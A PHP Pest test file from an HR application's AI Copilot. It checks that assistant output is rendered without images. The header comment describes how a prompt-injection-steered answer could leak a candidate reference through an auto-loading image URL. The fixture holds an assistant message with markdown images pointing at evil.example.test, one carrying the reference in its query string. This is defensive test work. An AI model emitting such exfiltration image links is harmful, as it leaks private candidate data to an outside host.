<?php

use App\Filament\Pages\AiCopilot;
use App\Models\AiConversation;
use App\Models\Candidate;
use App\Models\CandidateApplication;
use App\Models\Employee;
use App\Models\User;
use App\Services\AI\Privacy\AiReference;
use Database\Seeders\RolePermissionSeeder;
use Livewire\Livewire;

use function Pest\Laravel\actingAs;

/*
 * Phase 8.10 (P810-AI-03): a model answer steered by prompt injection could carry an image whose URL
 * holds a candidate reference. References resolve to names for the viewer, and an image loads
 * without a click — so AI output never renders images, on the Copilot or in the conversation review.
 */
beforeEach(function (): void {
    $this->seed(RolePermissionSeeder::class);
    $this->user = User::factory()->create(['employee_id' => Employee::factory()->create()->id])->assignRole('chro');
    $this->candidate = Candidate::factory()->create(['full_name' => 'PRIVATE-NAME-RAVI']);
    CandidateApplication::factory()->create(['candidate_id' => $this->candidate->id]);
    $reference = AiReference::candidate($this->candidate);

    $this->conversation = AiConversation::factory()->create(['user_id' => $this->user->id]);
    $this->conversation->messages()->create(['role' => 'user', 'content' => 'Summarise the shortlist']);
    $this->conversation->messages()->create(['role' => 'assistant', 'content' => "**Shortlist** for {$reference}\n\n- strong fit\n\n![chart](<https://evil.example.test/c?d={$reference}>) ![logo](https://evil.example.test/p.png)"]);
});

function expectNoImage(string $html): void
{
    expect($html)->not->toContain('<img')
        ->and($html)->not->toContain('evil.example.test');
}

test('the Copilot renders AI text without images, keeping the rest of the Markdown', function (): void {
    actingAs($this->user);

    $html = Livewire::test(AiCopilot::class)->call('switchConversation', $this->conversation->id)->html();

    expectNoImage($html);
    expect($html)->toContain('<strong>Shortlist</strong>')
        ->and($html)->toContain('PRIVATE-NAME-RAVI')
        ->and($html)->toContain('chart');
});

test('the conversation review renders AI text without images', function (): void {
    // The panel chrome has its own images, so the check is on the attacker's host.
    actingAs($this->user)->get("/admin/acme/ai-conversations/{$this->conversation->id}")
        ->assertSuccessful()
        ->assertSee('Shortlist')
        ->assertDontSee('evil.example.test');
});
